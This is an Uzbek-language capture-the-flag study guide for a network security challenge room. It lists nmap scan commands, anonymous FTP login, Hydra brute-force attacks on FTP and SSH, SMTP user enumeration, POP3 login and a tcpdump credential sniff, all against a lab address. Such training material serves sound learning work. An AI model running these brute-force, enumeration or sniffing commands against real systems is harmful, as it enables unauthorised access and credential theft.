# 🏆 Net Sec Challenge (Tarmoq Xavfsizligi Musobaqa)

> **Maqsad:** Network Security bo'limida o'rganilgan barcha ko'nikmalarni amalda qo'llash — Nmap, protokollar, parol hujumlari.

---

## 📖 Challenge Haqida

Bu room Network Security bo'limidagi barcha ko'nikmalarni sinaydi:
- Nmap skan turlari
- Port va xizmat aniqlash
- FTP, SSH, HTTP, SMTP, POP3 bilan ishlash
- Parol brute force
- Tarmoq tinglash

---

## 🔍 Boshlash: Razvedka

```bash
# 1. Tirik hostni aniqlash:
ping -c 3 10.10.10.1

# 2. Tez port skan:
sudo nmap -sS -T4 --top-ports 1000 10.10.10.1

# 3. To'liq port skan:
sudo nmap -sS -T4 -p- 10.10.10.1

# 4. Xizmat + versiya + OS:
sudo nmap -sV -sC -O -T4 10.10.10.1

# 5. UDP portlar:
sudo nmap -sU --top-ports 20 10.10.10.1
```

---

## 🎯 Tipik Challenge Yechish Tartibi

### 1-qadam: Port Skan
```bash
sudo nmap -sV -sC -T4 -p- 10.10.10.1 -oN scan.txt

# Natija misoli:
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.2p1
# 80/tcp   open  http    Apache 2.4.41
# 21/tcp   open  ftp     vsftpd 3.0.3
# 110/tcp  open  pop3    Dovecot pop3d
# 25/tcp   open  smtp    Postfix smtpd
```

### 2-qadam: FTP tekshirish
```bash
# Anonim kirish:
ftp 10.10.10.1
# Username: anonymous
# Password: (Enter)

# Agar kirsa:
ls -la
get flag.txt
cat flag.txt

# Hydra bilan brute force:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.1
```

### 3-qadam: HTTP tekshirish
```bash
curl -I http://10.10.10.1
curl http://10.10.10.1/robots.txt

# Gobuster:
gobuster dir -u http://10.10.10.1 \
  -w /usr/share/wordlists/dirb/common.txt

# Nmap skript:
nmap --script=http-enum 10.10.10.1
```

### 4-qadam: SMTP foydalanuvchi aniqlash
```bash
# Telnet bilan:
telnet 10.10.10.1 25
VRFY root
VRFY admin
VRFY user

# Nmap bilan:
nmap --script=smtp-enum-users \
  --script-args smtp-enum-users.userlist=/usr/share/seclists/Usernames/Names/names.txt \
  10.10.10.1
```

### 5-qadam: POP3 kirish
```bash
# Topilgan username + parol bilan:
telnet 10.10.10.1 110
USER admin
PASS password123
STAT
LIST
RETR 1
```

### 6-qadam: SSH kirish
```bash
ssh admin@10.10.10.1
# yoki kalit bilan:
ssh -i id_rsa admin@10.10.10.1

# Brute force:
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -t 4
```

---

## 🔑 Nmap Skan Turlari Eslatmasi

```bash
# Asosiy skanlar:
-sT    → TCP Connect (root kerak emas)
-sS    → TCP SYN (root kerak, standart)
-sU    → UDP skan
-sN    → NULL skan (yashirin)
-sF    → FIN skan (yashirin)
-sX    → Xmas skan (yashirin)
-sA    → ACK skan (firewall xaritasi)
-sI    → Idle/Zombie skan (eng yashirin)

# Ma'lumot:
-sV    → Xizmat versiyasi
-O     → OS aniqlash
-sC    → Standart skriptlar
-A     → Hammasi

# Port:
-p 80        → Bitta port
-p 80,443    → Bir nechta
-p 1-1000    → Oraliq
-p-          → Barcha portlar
-F           → Top 100

# Tezlik:
-T0 → Juda sekin
-T4 → Tez
-T5 → Juda tez
```

---

## 🛠️ Tezkor Buyruqlar

```bash
# To'liq razvedka:
sudo nmap -A -T4 -p- -oA results 10.10.10.1

# FTP anonim:
ftp 10.10.10.1  # anonymous / (Enter)

# FTP brute:
hydra -l admin -P rockyou.txt ftp://10.10.10.1

# SSH brute:
hydra -l admin -P rockyou.txt -t 4 ssh://10.10.10.1

# SMTP enum:
nmap --script=smtp-enum-users 10.10.10.1

# POP3 qo'lda:
telnet IP 110 → USER x → PASS x → RETR 1

# HTTP enum:
gobuster dir -u http://IP -w common.txt

# Sniff:
sudo tcpdump -i eth0 -A port 21 | grep -E "USER|PASS"
```

---

## 🏁 Flag Topish Joylari

```
HTTP:  /robots.txt, /flag.txt, sahifa kodi
FTP:   ls → get flag.txt
SSH:   ~/flag.txt, ~/user.txt, ~/root.txt
SMTP:  VRFY orqali username topish
POP3:  RETR 1 → xabarda flag
Nmap:  --script=http-robots.txt, skript natijasi
```

---

## 💡 Eslab Qolish Uchun

```
Razvedka tartibi:
1. ping → Tirikmi?
2. nmap -sS -p- → Portlar
3. nmap -sV -sC → Xizmatlar
4. Har xizmatni alohida tekshir:
   - FTP: anonim? brute?
   - HTTP: robots.txt, gobuster
   - SMTP: VRFY enum
   - POP3/IMAP: xabarlar
   - SSH: kalit yoki brute
```

**Muhim Nmap flaglari:**
```
-sS  → Standart SYN (eng ko'p)
-sV  → Versiya
-sC  → Skriptlar
-A   → Hammasi
-p-  → Barcha portlar
-oA  → Saqlash
```
